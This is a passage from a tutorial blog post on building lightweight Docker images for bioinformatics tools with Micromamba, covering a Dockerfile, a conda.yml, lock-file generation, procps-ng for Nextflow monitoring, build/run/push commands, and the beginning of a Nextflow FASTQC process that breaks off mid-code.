<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="understanding-the-dockerfile">Understanding the Dockerfile<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#understanding-the-dockerfile" class="hash-link" aria-label="Direct link to Understanding the Dockerfile" title="Direct link to Understanding the Dockerfile" translate="no">​</a></h3>
<p>Let's break down each component:</p>
<p><strong>1. Base Image:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> mambaorg/micromamba:1.5.10-noble</span><br></span></code></pre></div></div>
<ul>
<li class=""><code>mambaorg/micromamba</code> includes Micromamba pre-installed</li>
<li class=""><code>1.5.10</code> is the version (pin for reproducibility)</li>
<li class=""><code>noble</code> is Ubuntu 24.04 LTS variant</li>
<li class="">Much lighter than installing Conda from scratch</li>
</ul>
<p><strong>2. Copy Environment File:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">COPY</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--chown</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">$MAMBA_USER:$MAMBA_USER</span><span class="token instruction"> conda.yml /tmp/conda.yml</span><br></span></code></pre></div></div>
<ul>
<li class="">Copies your conda.yml to the container</li>
<li class=""><code>$MAMBA_USER</code> is the non-root user (set by base image)</li>
<li class="">Preserves proper file ownership</li>
</ul>
<p><strong>3. Install with Micromamba:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> micromamba install -y -n base -f /tmp/conda.yml </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; micromamba clean -a -y</span><br></span></code></pre></div></div>
<ul>
<li class=""><code>-y</code>: Auto-confirm installation</li>
<li class=""><code>-n base</code>: Install into the base environment</li>
<li class=""><code>-f /tmp/conda.yml</code>: Use environment file</li>
<li class=""><code>micromamba clean -a -y</code>: Remove cached packages (reduces image size by ~50%)</li>
</ul>
<p><strong>4. Generate Lock File (for reproducibility):</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> micromamba env export --name base --explicit &gt; environment.lock </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; echo </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"&gt;&gt; CONDA_LOCK_START"</span><span class="token instruction"> </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; cat environment.lock </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; echo </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"&lt;&lt; CONDA_LOCK_END"</span><br></span></code></pre></div></div>
<ul>
<li class="">Exports explicit lock file with exact pinned versions and URLs</li>
<li class="">Echo statements make lock file visible in build logs</li>
<li class="">This file can be saved and used for exact reproducibility later</li>
</ul>
<p><strong>5. Set PATH and User:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">USER</span><span class="token instruction"> root</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ENV</span><span class="token instruction"> PATH=</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"$MAMBA_ROOT_PREFIX/bin:$PATH"</span><br></span></code></pre></div></div>
<ul>
<li class="">Ensures Micromamba binaries are in PATH</li>
<li class=""><code>USER root</code> required for some system monitoring (see procps-ng below)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-procps-ng-is-important-for-nextflow">Why procps-ng is Important for Nextflow<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#why-procps-ng-is-important-for-nextflow" class="hash-link" aria-label="Direct link to Why procps-ng is Important for Nextflow" title="Direct link to Why procps-ng is Important for Nextflow" translate="no">​</a></h3>
<p>Notice <code>conda-forge::procps-ng</code> in the dependencies. Here's why:</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">dependencies</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> conda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">forge</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">procps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">ng</span><br></span></code></pre></div></div>
<p>Nextflow uses <code>procps-ng</code> tools (like <code>ps</code>, <code>top</code>) to monitor:</p>
<ul>
<li class="">CPU usage</li>
<li class="">Memory consumption</li>
<li class="">Process status</li>
</ul>
<p>Without it, Nextflow cannot properly track task resource usage. Always include it in bioinformatics containers.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="complete-multi-tool-example">Complete Multi-Tool Example<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#complete-multi-tool-example" class="hash-link" aria-label="Direct link to Complete Multi-Tool Example" title="Direct link to Complete Multi-Tool Example" translate="no">​</a></h3>
<p>Here's a full example with multiple bioinformatics tools:</p>
<p><strong>conda.yml:</strong></p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> base</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">channels</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> conda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">forge</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">dependencies</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">fastqc=0.12.1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">samtools=1.18</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">bwa=0.7.17</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">bcftools=1.18</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">picard=3.0.0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> conda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">forge</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">procps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">ng</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> conda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">forge</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">parallel</span><br></span></code></pre></div></div>
<p><strong>Dockerfile:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> mambaorg/micromamba:1.5.10-noble</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">COPY</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--chown</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">$MAMBA_USER:$MAMBA_USER</span><span class="token instruction"> conda.yml /tmp/conda.yml</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> micromamba install -y -n base -f /tmp/conda.yml </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; micromamba install -y -n base conda-forge::procps-ng </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; micromamba env export --name base --explicit &gt; environment.lock </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; echo </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"&gt;&gt; CONDA_LOCK_START"</span><span class="token instruction"> </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; cat environment.lock </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; echo </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"&lt;&lt; CONDA_LOCK_END"</span><span class="token instruction"> </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; micromamba clean -a -y</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">USER</span><span class="token instruction"> root</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ENV</span><span class="token instruction"> PATH=</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"$MAMBA_ROOT_PREFIX/bin:$PATH"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">WORKDIR</span><span class="token instruction"> /data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">CMD</span><span class="token instruction"> [</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"/bin/bash"</span><span class="token instruction">]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="building-and-using-your-container">Building and Using Your Container<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#building-and-using-your-container" class="hash-link" aria-label="Direct link to Building and Using Your Container" title="Direct link to Building and Using Your Container" translate="no">​</a></h3>
<p><strong>1. Build the image:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> build </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><span class="token plain"> myregistry.com/bioinformatics/biotools:1.0 </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><br></span></code></pre></div></div>
<p><strong>2. Test it locally:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token string" style="color:hsl(119, 34%, 47%)">:/data"</span><span class="token plain"> myregistry.com/bioinformatics/biotools:1.0 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastqc /data/sample.fastq</span><br></span></code></pre></div></div>
<p><strong>3. Push to registry:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> push myregistry.com/bioinformatics/biotools:1.0</span><br></span></code></pre></div></div>
<p><strong>4. Use in Nextflow:</strong></p>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process FASTQC </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tag </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    label </span><span class="token string" style="color:hsl(119, 34%, 47%)">'process_medium'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    conda </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">moduleDir</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">/environment.yml"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container "</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> workflow</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">containerEngine </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'singularity'</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain">task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">singularity_pull_docker_container </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'https://depot.galaxyproject.org/singularity/fastqc:0.12.1--hdfd78af_0'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'biocontainers/fastqc:0.12.1--hdfd78af_0'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"*.html"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> html</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"*.zip"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> zip</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path  </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"versions.yml"</span><span class="token plain">           </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> versions</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token spock-block">when:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">when </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> null </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">when</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> args          </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">args </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> prefix        </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?:</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// Make list of old name and new name pairs to use for renaming in the bash while loop</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> old_new_pairs </span><span class="token operator" style="color:hsl(221, 